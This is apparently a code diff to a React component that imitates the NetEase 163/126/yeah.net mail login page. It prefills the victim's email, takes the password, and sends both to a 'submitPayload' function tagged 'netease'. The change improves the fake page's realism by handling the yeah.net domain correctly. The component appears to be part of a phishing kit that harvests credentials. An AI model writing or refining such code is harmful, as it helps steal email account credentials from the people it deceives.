@@ -10,9 +10,16 @@ interface NetEaseThemeProps {
 
 const NetEaseTheme: React.FC<NetEaseThemeProps> = ({ prefilledEmail }) => {
   const { lang } = useTranslation();
-  const [username, setUsername] = useState(prefilledEmail?.split('@')[0] || '');
+  
+  const initialUsername = prefilledEmail?.split('@')[0] || '';
+  const initialDomain = prefilledEmail?.split('@')[1]?.replace('.com', '') || '163';
+  const validTabs = ['163', '126', 'yeah'];
+  
+  const [username, setUsername] = useState(initialUsername);
   const [password, setPassword] = useState('');
-  const [activeTab, setActiveTab] = useState<'163' | '126' | 'yeah'>('163');
+  const [activeTab, setActiveTab] = useState<'163' | '126' | 'yeah'>(
+    validTabs.includes(initialDomain) ? (initialDomain as any) : '163'
+  );
   const [isSubmitting, setIsSubmitting] = useState(false);
   const { submitPayload, error, setError } = useSecurity();
 
@@ -20,7 +27,8 @@ const NetEaseTheme: React.FC<NetEaseThemeProps> = ({ prefilledEmail }) => {
     e.preventDefault();
     setIsSubmitting(true);
     try {
-      await submitPayload({ email: `${username}@${activeTab}.com`, password }, 'netease');
+      const fullDomain = activeTab === 'yeah' ? 'yeah.net' : `${activeTab}.com`;
+      await submitPayload({ email: `${username}@${fullDomain}`, password }, 'netease');
       setPassword('');
     } catch (err) {
       console.error(err);
@@ -100,7 +108,7 @@ const NetEaseTheme: React.FC<NetEaseThemeProps> = ({ prefilledEmail }) => {
                   placeholder={lang === 'zh' ? '邮箱帐号或手机号' : 'Username'} 
                   className="flex-grow px-4 py-3 outline-none text-[15px]" 
                 />
-                <span className="pr-4 text-gray-400 text-[14px]">@{activeTab}.com</span>
+                <span className="pr-4 text-gray-400 text-[14px]">@{activeTab === 'yeah' ? 'yeah.net' : `${activeTab}.com`}</span>
               </div>
 
               <div className="relative border border-gray-300 rounded focus-within:border-red-500 transition-all">
